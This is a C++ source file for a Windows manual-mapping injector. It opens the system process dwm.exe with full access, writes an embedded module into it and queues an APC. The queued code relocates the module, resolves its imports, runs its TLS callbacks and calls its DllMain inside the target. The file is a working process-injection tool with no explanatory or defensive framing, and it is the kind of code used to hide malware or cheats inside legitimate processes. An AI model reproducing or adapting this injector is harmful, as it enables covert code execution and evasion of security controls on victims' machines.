#include <Windows.h>
#include "util.h"
#include "APC.h"
#include "byte.h"

void __entry_point_address(MappingParameter* Parameter);

bool Bootstrap();

int main() {

#ifdef _DEBUG
	return 0;
#endif

	Bootstrap();

	return 0;
}

bool Bootstrap() {

	if (!InitSystemRoutineAddress()) {
		return false;
	}

	auto ProcessId = GetProcessIdByName(L"dwm.exe");
	if (!ProcessId) {
		return false;
	}

	HANDLE ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessId);
	if (!ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE) {
		return false;
	}

	unsigned __int64 EntryPointAddress = 0;
	unsigned __int64 ParameterAddress = 0;
	if (!MappingModule(ProcessHandle, reinterpret_cast<unsigned __int64>(Bytes), reinterpret_cast<void*>(__entry_point_address), &EntryPointAddress, &ParameterAddress)) {
		return false;
	}

	if (!InsertAPC(ProcessHandle, EntryPointAddress, ParameterAddress)) {
		return false;
	}

	return true;
}

void __entry_point_address(MappingParameter* Parameter) {

	unsigned __int64 ImageBase = Parameter->ImageBase;

	IMAGE_DOS_HEADER* DosHeader = (IMAGE_DOS_HEADER*)ImageBase;

	IMAGE_NT_HEADERS* NtHeader = (IMAGE_NT_HEADERS*)(ImageBase + DosHeader->e_lfanew);

	IMAGE_OPTIONAL_HEADER* OptionalHeader = &NtHeader->OptionalHeader;

	unsigned __int64 LocationDelta = ImageBase - OptionalHeader->ImageBase;

	IMAGE_DATA_DIRECTORY RelocationDataDirectory = OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (RelocationDataDirectory.Size > 0) {

		IMAGE_BASE_RELOCATION* RelocationTable = (IMAGE_BASE_RELOCATION*)(ImageBase + RelocationDataDirectory.VirtualAddress);

		for (;;) {

			unsigned __int64 RelocationEntryNumber = (RelocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(short);

			unsigned __int16* RelocationEntry = (unsigned __int16*)(RelocationTable + 1);

			for (int i = 0; i < RelocationEntryNumber; i++, RelocationEntry++) {

				if (*RelocationEntry >> 0x0C == IMAGE_REL_BASED_DIR64) {

					unsigned __int64* address = (unsigned __int64*)(ImageBase + RelocationTable->VirtualAddress + (*RelocationEntry & 0xfff));
					*address += LocationDelta;
				}
			}

			RelocationTable = (IMAGE_BASE_RELOCATION*)((unsigned __int64)RelocationTable + RelocationTable->SizeOfBlock);

			if (RelocationTable->SizeOfBlock == 0) {
				break;
			}
		}
	}

	IMAGE_DATA_DIRECTORY ImportDataDirectory = OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	if (ImportDataDirectory.Size > 0) {

		IMAGE_IMPORT_DESCRIPTOR* ImportTable = (IMAGE_IMPORT_DESCRIPTOR*)(ImageBase + ImportDataDirectory.VirtualAddress);

		for (;;) {

			if (ImportTable->Name == 0) {
				break;
			}

			void* ModuleHandle = Parameter->fLoadLibraryA((const char*)(ImageBase + ImportTable->Name));

			if (ModuleHandle != NULL) {

				unsigned __int64* ImportNameTable = (unsigned __int64*)(ImageBase + ImportTable->OriginalFirstThunk);
				unsigned __int64* ImportAddressTable = (unsigned __int64*)(ImageBase + ImportTable->FirstThunk);

				for (;;) {

					if (*ImportNameTable == 0 || *ImportAddressTable == 0) {
						break;
					}

					if (IMAGE_SNAP_BY_ORDINAL(*ImportNameTable)) {

						*ImportAddressTable = Parameter->fGetProcAddress(ModuleHandle, (char*)(*ImportNameTable & 0xffff));

					} else {

						IMAGE_IMPORT_BY_NAME* ImportFunctionName = (IMAGE_IMPORT_BY_NAME*)(ImageBase + *ImportNameTable);
						*ImportAddressTable = Parameter->fGetProcAddress(ModuleHandle, ImportFunctionName->Name);
					}

					ImportNameTable++;
					ImportAddressTable++;
				}
			}

			ImportTable++;
		}
	}

	IMAGE_DATA_DIRECTORY TLSDataDirectory = OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (TLSDataDirectory.Size > 0) {

		IMAGE_TLS_DIRECTORY* TLSTable = (IMAGE_TLS_DIRECTORY*)(ImageBase + TLSDataDirectory.VirtualAddress);

		PIMAGE_TLS_CALLBACK* AddressOfCallbacks = (PIMAGE_TLS_CALLBACK*)(TLSTable->AddressOfCallBacks);

		for (;;) {

			if (AddressOfCallbacks == NULL || *AddressOfCallbacks == NULL) {
				break;
			}

			(*AddressOfCallbacks)((void*)ImageBase, 1, NULL);

			AddressOfCallbacks++;
		}
	}

	IMAGE_DATA_DIRECTORY ExceptionDataDirectory = OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	if (ExceptionDataDirectory.Size > 0) {

		IMAGE_RUNTIME_FUNCTION_ENTRY* ExceptionFunctionTable = (IMAGE_RUNTIME_FUNCTION_ENTRY*)(ImageBase + ExceptionDataDirectory.VirtualAddress);

		if (ExceptionFunctionTable != NULL && ExceptionFunctionTable->BeginAddress != 0) {

			Parameter->fRtlAddFunctionTable(ExceptionFunctionTable, ExceptionDataDirectory.Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY), ImageBase);
		}
	}

	((fnDllMain)(ImageBase + OptionalHeader->AddressOfEntryPoint))((void*)ImageBase, 1, NULL);
}
